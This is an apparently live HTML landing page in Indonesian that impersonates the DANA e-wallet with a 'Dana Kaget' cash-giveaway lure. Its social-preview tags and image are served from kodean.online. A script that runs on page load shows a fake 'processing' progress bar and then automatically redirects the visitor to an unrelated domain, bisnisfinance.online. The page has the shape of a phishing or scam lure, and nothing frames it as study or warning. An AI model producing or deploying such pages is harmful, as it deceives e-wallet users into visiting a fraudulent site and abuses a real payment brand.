<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>DANA - Dompet Digital Indonesia</title>

<!-- OPEN GRAPH -->
<meta property="og:title" content="DANA - Dompet Digital Indonesia">
<meta property="og:description" content="Dana adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA.">
<meta property="og:image" content="https://kodean.online/assets/img/danakaget.jpg">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="630">
<meta property="og:url" content="https://kodean.online/danakaget">
<meta property="og:type" content="website">

<meta name="description" content="Dana kaget tersedia hari ini">

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial}
body{
  background:#118eea;
  color:#fff;
  display:flex;
  justify-content:center;
  align-items:center;
  min-height:100vh
}
.box{
  text-align:center;
  padding:30px
}
img{
  width:160px;
  border-radius:20px;
  margin-bottom:20px;
  box-shadow:0 0 30px rgba(255,255,255,.4)
}
h1{font-size:22px;margin-bottom:10px}
p{font-size:14px;opacity:.9}

.bar{
  margin-top:20px;
  width:100%;
  height:10px;
  background:#ffffff33;
  border-radius:20px;
  overflow:hidden
}
.bar span{
  display:block;
  height:100%;
  width:0%;
  background:#fff;
  transition:.2s
}
</style>

<script>
document.addEventListener("DOMContentLoaded",()=>{
  const bar = document.getElementById("bar");
  let w = 0;
  const iv = setInterval(()=>{
    w += Math.random()*8;
    if(w >= 100){
      w = 100;
      clearInterval(iv);
      setTimeout(()=>{
        window.location.href = "https://bisnisfinance.online";
      },600);
    }
    bar.style.width = w + "%";
  },120);
});
</script>

</head>
<body>

<div class="box">
  <img src="https://kodean.online/assets/img/danakaget.jpg">
  <h1>Memproses Dana Kaget...</h1>
  <p>Mohon tunggu sebentar</p>

  <div class="bar"><span id="bar"></span></div>
</div>

</body>
</html>
